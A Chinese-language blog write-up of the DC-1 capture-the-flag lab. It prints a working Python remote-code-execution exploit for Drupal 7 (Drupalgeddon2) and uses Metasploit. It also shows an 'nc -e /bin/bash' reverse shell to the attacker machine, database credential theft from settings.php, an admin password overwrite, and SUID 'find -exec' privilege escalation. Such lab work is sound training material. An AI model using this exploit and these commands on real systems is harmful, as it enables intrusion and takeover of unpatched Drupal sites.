---
title: DC-1靶场练习
date: 2021-12-19 21:16:26
tags: DC靶场系列
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png
---

# DC-1靶场练习

## 练习环境

kali:192.168.10.128

靶机:未知

两个虚拟机都使用桥接(为了方便)

## 信息收集

先用kali扫描域内存活的主机

```
nmap 192.168.10.0/24
```

![image-20211219161524442](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161524442.png)

扫描到靶机，获得以下信息：

* 靶机IP:192.168.10.100

* 开放端口: 22(ssh),80(http),111(rpcbind)

先从80端口入手,浏览器打开

```
http://192.168.10.100
```

![image-20211219161912348](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161912348.png)

使用Wappalyzer查看信息

![image-20211219162152997](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162152997.png)

可以看到这个网站的cms是`Drupal 7`

然后就出于本能的去搜索一下这个版本的CMS的漏洞

![image-20211219162454136](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162454136.png)

经过一番查找，得到该漏洞的交互式命令执行python3脚本：

```
import requests
import re
from sys import argv

domain = argv[1]


def exploit(command):
	HOST=domain

	get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':command, 'name[#type]':'markup'}
	post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
	r = requests.post(HOST, data=post_params, params=get_params)

	m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
	if m:
	    found = m.group(1)
	    get_params = {'q':'file/ajax/name/#value/' + found}
	    post_params = {'form_build_id':found}
	    r = requests.post(HOST, data=post_params, params=get_params)
	    print("\n".join(r.text.split("\n")[:-1]))


while True:
	command = input('$ ')
	exploit(command)
```

## 攻击

先尝试用这个脚本，将代码保存在rce.py中

```
python3 rce.py http://192.168.10.100/
```

![image-20211219163714876](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219163714876.png)

脚本很强，可以使用，直getshell了，但是使用起来不方便

尝试在msfconsole中查找脚本

![image-20211219164042118](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164042118.png)

找到8个，并且`exploit/multi/http/drupal_drupageddon `的和http有关，应该是这个了

设置好配置后尝试攻击

![image-20211219164634308](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164634308.png)

攻击成功



尝试获取反弹shell

```
kali：nc -lvvp 1234 
靶机 ：nc -e /bin/bash 192.168.10.128 1234
kali：python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20211219165140933](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165140933.png)

![image-20211219165153578](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165153578.png)

反弹成功

先查看文件一下

![image-20211219165247700](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165247700.png)

这里有一个flag1.txt,`cat flag1.txt`查看

![image-20211219165548731](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165548731.png)

翻译一下：

"每个好的 CMS 都需要一个配置文件 - 你也是。"

百度查找一下这个CMS的配置文件名字

![image-20211219165833472](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165833472.png)

路径都查出来了，直接查看settings.php

```
cat sites/default/settings.php
```

![image-20211219170147768](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170147768.png)

拿到了flag2,并且得到数据库信息

flag2的翻译：

![image-20211219170326017](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170326017.png)

我不懂作者要表达啥，但我知道要提权

根据上面信息，尝试连接数据库

```
mysql -udbuser -pR0ck3t
```

![image-20211219172022853](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172022853.png)

连接成功，查看数据库

```
show databases;
```

![image-20211219172120533](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172120533.png)

选定数据库drupaldb

```
use drupaldb;
```

查看这个数据库的表

```
show tables;
```

![image-20211219172403487](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172403487.png)

查询到敏感表`users`,查看里面的信息

```
select *from users;
```



![image-20211219172655690](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172655690.png)

可以看到admin的账号密码，密码被hash加密过,这里有两种选择，要么爆破，要么改数据库里的密码



由flag2提示，爆破这条路似乎走不通，只能修改密码

首先要找到它的加密脚本丢在哪里，百度一下得知脚本名称为`password-hash.sh`,然后查找一下

```
find / -name password-hash.sh
```

![image-20211219174428472](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219174428472.png)

得到路径: /var/www/scripts/password-hash.sh

使用drupal 自带脚本重新生成加密后的密码,这里打算把密码改为admin

```
./scripts/password-hash.sh admin
```

![image-20211219175317713](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175317713.png)

得到加密后的密码;

```
$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6
```

回到mysql修改admin密码

```
update users set pass='$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6' where uid=1;
```

![image-20211219175635384](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175635384.png)

密码修改成功

来到后台尝试登录

![image-20211219175851595](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175851595.png)

登录成功，并且得到flag3

![image-20211219175949955](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175949955.png)

![image-20211219180031924](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180031924.png)

翻译一下：

`特殊的PERMS 将帮助查找passwd——但您需要-exec 该命令来确定如何获取shadow中的内容。`

根据提示，查看/etc/passwd：

![image-20211219200505179](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200505179.png)

这里可以看到有个flag4用户，并且知道flag4路径，还有bash

查看/etc/shadow：权限不够

![image-20211219200613083](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200613083.png)



先查看flag4内容

![image-20211219180624886](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180624886.png)

```
Can you use this same method to find or access the flag in root?
您可以使用相同的方法在 root 中查找或访问flag吗？
Probably. But perhaps it's not that easy.  Or maybe it is?
大概。 但也许没那么容易。 或者也许是？
```



## 提权

liunx提权一般有四种提权方式：

* sudo提权，通过命令`sudo -l`查看是否有可提权的命令。

* suid提权，通过命令`find / -perm -4000 2>/dev/null`查看是否具有root权限的命令，

* 系统版本内核提权。

* 通过数据库提权。

先列出来以root权限执行的文件

```
find / -perm -4000 2>/dev/null
```

![image-20211219204647219](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219204647219.png)

find可以使用

常见的可以用来提权的文件:

```
Nmap
Vim
find
Bash
More
Less
Nano
cp
```



find 命令说明
-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。

```
//这个要在/var/www下执行
touch getflag
find / -type f -name getflag -exec "whoami" \;
find / -type f -name getflag -exec "/bin/sh" \;
```

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219210216024.png)



提权成功，获取root权限

现在目标就是找最后的flag,最后的flag在root目录下

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20211219205951044.png)

```
Well done!!!!
Hopefully you've enjoyed this and learned some new skills.
You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

